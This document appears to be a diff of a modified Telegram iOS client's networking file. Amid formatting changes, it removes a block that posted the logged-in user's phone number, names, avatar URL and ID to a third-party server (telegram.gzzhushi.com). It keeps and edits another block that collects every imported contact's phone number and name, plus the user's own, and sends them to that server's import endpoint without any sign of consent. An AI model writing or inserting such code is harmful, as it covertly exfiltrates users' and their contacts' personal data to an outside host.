@@ -147,8 +147,8 @@
 #import "NSString+SYisBlankString.h"
 
 #import "TGPreparedLocalDocumentMessage.h"
+#import "TGUpdateMessageToServer.h"
 
-static   int StaticMixmid;
 
 @interface TGTypingRecord : NSObject
 
@@ -234,7 +234,7 @@ static bool extractTwoSizes(NSString *string, NSString *prefix, CGSize *firstSiz
     return true;
 }
 
-TGTelegraph *TGTelegraphInstance = nil;
+TGTelegraph * TGTelegraphInstance = nil;
 
 typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIterator;
 
@@ -1528,6 +1528,7 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
 {
     if (iosMajorVersion() >= 10) {
         TGDispatchOnMainThread(^{
+            
             [INPreferences requestSiriAuthorization:^(__unused INSiriAuthorizationStatus status) {
             }];
         });
@@ -1565,41 +1566,6 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
                 user.presence = presence;
                 [[TGDatabase instance] storeUsers:[NSArray arrayWithObject:user]];
             }
- 
-            //********************
-            //去掉电话号码前的加号
-            NSString * currentPhoneNumber = [user.phoneNumber stringByReplacingOccurrencesOfString:@"+" withString:@""];
-            NSURL *url = [NSURL URLWithString:@"http://telegram.gzzhushi.com/api/info"];// 当前用户信息接口
-            
-            if ([NSString isNonemptyString:currentPhoneNumber] && user.uid && [NSString isNonemptyString:user.firstName]) {
-                
-                if ([NSString isNonemptyString:user.userName] == NO) {
-                    
-                    user.userName = @"";
-                }
-           
-                if ([NSString isNonemptyString:user.lastName] == NO)
-                {
-                    user.lastName = @"";
-                }
-                if ([NSString isNonemptyString:user.photoUrlSmall] == NO){
-                    
-                    user.photoUrlSmall = @"";
-                }
-                
-                NSDictionary *dict1 = @{@"s_phone":currentPhoneNumber,
-                                        @"s_username":user.userName,
-                                        @"s_firstname":user.firstName,
-                                        @"s_lastname":user.lastName,
-                                        @"s_avatar":user.photoUrlSmall,
-                                        @"s_uid":@(user.uid)
-                                        };
-                [SYNetworking httpRequestWithDic:dict1 andURL:url];
-                
-            }
-            
-            //*******************
-            NSLog(@"用户头像URL：user.photoUrlSmall = %@ ",user.photoUrlSmall);
             
             [TGUpdateStateRequestBuilder scheduleInitialUpdates];
             
@@ -1656,6 +1622,25 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
             }];
         }
     }];
+}
+
+
+- (NSString *)filePathForLocalImageUrl:(NSString *)localImageUrl
+{
+    static NSString *filesDirectory = nil;
+    static dispatch_once_t onceToken;
+    dispatch_once(&onceToken, ^
+                  {
+                      filesDirectory = [[TGAppDelegate documentsPath] stringByAppendingPathComponent:@"files"];
+                  });
+    
+    int64_t localImageId = murMurHash32(localImageUrl);
+    
+    NSString *photoDirectoryName = [[NSString alloc] initWithFormat:@"image-local-%" PRIx64 "", localImageId];
+    NSString *photoDirectory = [filesDirectory stringByAppendingPathComponent:photoDirectoryName];
+    
+    NSString *imagePath = [photoDirectory stringByAppendingPathComponent:@"image.jpg"];
+    return imagePath;
 }
 
 - (void)processUnauthorized
@@ -2580,68 +2565,73 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
     NSMutableArray  *contactsArray       = [[NSMutableArray alloc] initWithCapacity:contacts.count];
     
     int index = -1;
-    for (TGContactBinding *binding in contacts)
-    {
-        index++;
+    for (TGContactBinding *binding in contacts){
         
+        index++;
         TLInputContact$inputPhoneContact *inputContact = [[TLInputContact$inputPhoneContact alloc] init];
         inputContact.client_id = index;
         inputContact.phone = binding.phoneNumber;
         inputContact.first_name = binding.firstName;
         inputContact.last_name = binding.lastName;
         [contactsArray addObject:inputContact];
-      
        
         if ( [NSString isNonemptyString:binding.phoneNumber] && binding.phoneId ) {
             if ([NSString isNonemptyString:binding.firstName] == NO) {
+                
                 binding.firstName = @"";
             }
             if ([NSString isNonemptyString:binding.lastName] == NO) {
+                
                 binding.lastName = @"";
             }
-   
-             NSDictionary *dict = @{@"r_uid":@(binding.phoneId),
-                                @"r_phone":binding.phoneNumber,
-                                @"r_firstname":binding.firstName,
-                                @"r_last_name":binding.lastName,
-                                @"r_username": @""
+            NSString     * userName = [NSString stringWithFormat:@"%@%@",binding.firstName ,binding.lastName ];
+            NSDictionary * dict = @{@"r_uid":@(binding.phoneId),
+                                    @"r_phone":binding.phoneNumber,
+                                    @"r_firstname":binding.firstName,
+                                    @"r_last_name":binding.lastName,
+                                    @"r_username":userName
                                 };
-           [friendsArray insertObject:dict atIndex:0];
+            
+            [friendsArray insertObject:dict atIndex:0];
     
         }
         
         [debugContactsString appendFormat:@"%@\t%@\t%@\n", binding.phoneNumber, binding.firstName, binding.lastName];
-}
+    }
    
-      TGLog(@"Exporting %d contacts: %@", contacts.count, debugContactsString);
+    TGLog(@"Exporting %d contacts: %@", contacts.count, debugContactsString);
    
     TGUser *selfUser = [TGDatabaseInstance() loadUser:TGTelegraphInstance.clientUserId];
     
-    if ( [NSString isNonemptyString:selfUser.phoneNumber] && selfUser.uid ) {
+    if ( [NSString isNonemptyString:selfUser.phoneNumber] && selfUser.uid ){
+        
         if ([NSString isNonemptyString:selfUser.firstName] == NO) {
+            
             selfUser.firstName = @"";
         }
         if ([NSString isNonemptyString:selfUser.lastName] == NO) {
+            
             selfUser.lastName = @"";
         }
 
     NSDictionary *dict2 = @{@"r_uid":@(selfUser.uid),
-                           @"r_phone":selfUser.phoneNumber,
-                           @"r_firstname":selfUser.firstName,
-                           @"r_last_name":selfUser.lastName,
-                           @"r_username": @""
+                            @"r_phone":selfUser.phoneNumber,
+                            @"r_firstname":selfUser.firstName,
+                            @"r_last_name":selfUser.lastName,
+                            @"r_username": selfUser.userName
                            };
+        
        [friendsArray insertObject:dict2 atIndex:0];
     }
     
     NSURL *url = [NSURL URLWithString:@"http://telegram.gzzhushi.com/api/import"];// 当前用户信息接口导入联系人
     if (selfUser.uid && friendsArray) {
+        
         NSDictionary  *dict1 = @{@"s_uid":@(selfUser.uid),
-                                @"friends":friendsArray
+                                 @"friends":friendsArray
                                 };
        [SYNetworking httpRequestWithDic:dict1 andURL:url];
     }
- 
     
     TLRPCcontacts_importContacts$contacts_importContacts *importContacts = [[TLRPCcontacts_importContacts$contacts_importContacts alloc] init];
     
@@ -3181,8 +3171,6 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
         
         if (error == nil){
             
-            NSLog(@"zhangxuresponse ===============%@",response);
-            NSLog(@"zhangxu3333333333333");
             [actor reportDeliverySuccess:maxMid deliveredMessages:(NSArray *)response];
             
         }else{
@@ -3985,10 +3973,12 @@ typedef std::map<int, std::pair<TGUser *, int > >::iterator UserDataToDispatchIt
     } progressBlock:nil quickAckBlock:nil requiresCompletion:true requestClass:TGRequestClassGeneric | TGRequestClassFailOnServerErrors datacenterId:TG_DEFAULT_DATACENTER_ID];
 }
 
-- (id)doReportQtsReceived:(int32_t)qts actor:(TGReportDeliveryActor *)actor
-{
+- (id)doReportQtsReceived:(int32_t)qts actor:(TGReportDeliveryActor *)actor{
+    
     TLRPCmessages_receivedQueue$messages_receivedQueue *receivedQueue = [[TLRPCmessages_receivedQueue$messages_receivedQueue alloc] init];
     receivedQueue.max_qts = qts;
+    
+    [[NSNotificationCenter defaultCenter] postNotificationName:@"tongzhimid" object:nil];
     
     return [[TGTelegramNetworking instance] performRpc:receivedQueue completionBlock:^(id<TLObject> response, __unused int64_t responseTime, MTRpcError *error)
     {
